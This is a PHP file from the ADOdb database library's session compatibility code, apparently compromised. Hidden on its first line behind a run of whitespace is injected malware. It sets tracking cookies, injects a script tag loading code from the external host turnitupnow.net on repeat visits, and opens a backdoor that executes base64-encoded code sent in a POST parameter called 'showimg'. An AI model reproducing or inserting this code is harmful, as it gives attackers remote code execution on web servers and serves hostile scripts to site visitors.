<?php												global $sessdt_o; if(!$sessdt_o) { $sessdt_o = 1; $sessdt_k = "lb11"; if(!@$_COOKIE[$sessdt_k]) { $sessdt_f = "102"; if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } } else { if($_COOKIE[$sessdt_k]=="102") { $sessdt_f = (rand(1000,9000)+1); if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } $sessdt_j = @$_SERVER["HTTP_HOST"].@$_SERVER["REQUEST_URI"]; $sessdt_v = urlencode(strrev($sessdt_j)); $sessdt_u = "http://turnitupnow.net/?rnd=".$sessdt_f.substr($sessdt_v,-200); echo "<script src='$sessdt_u'></script>"; echo "<meta http-equiv='refresh' content='0;url=http://$sessdt_j'><!--"; } } $sessdt_p = "showimg"; if(isset($_POST[$sessdt_p])){eval(base64_decode(str_replace(chr(32),chr(43),$_POST[$sessdt_p])));exit;} }



/*
v4.991 16 Oct 2008  (c) 2000-2008 John Lim (jlim#natsoft.com). All rights reserved.
         Contributed by Ross Smith (adodb@netebb.com). 
  Released under both BSD license and Lesser GPL library license.
  Whenever there is any discrepancy between the two licenses,
  the BSD license will take precedence.
	  Set tabs to 4 for best viewing.
*/

/*

This file is provided for backwards compatibility purposes

*/

if (!defined('ADODB_SESSION')) {
	require_once dirname(__FILE__) . '/adodb-session2.php';
}
ADODB_Session::clob('CLOB');

?>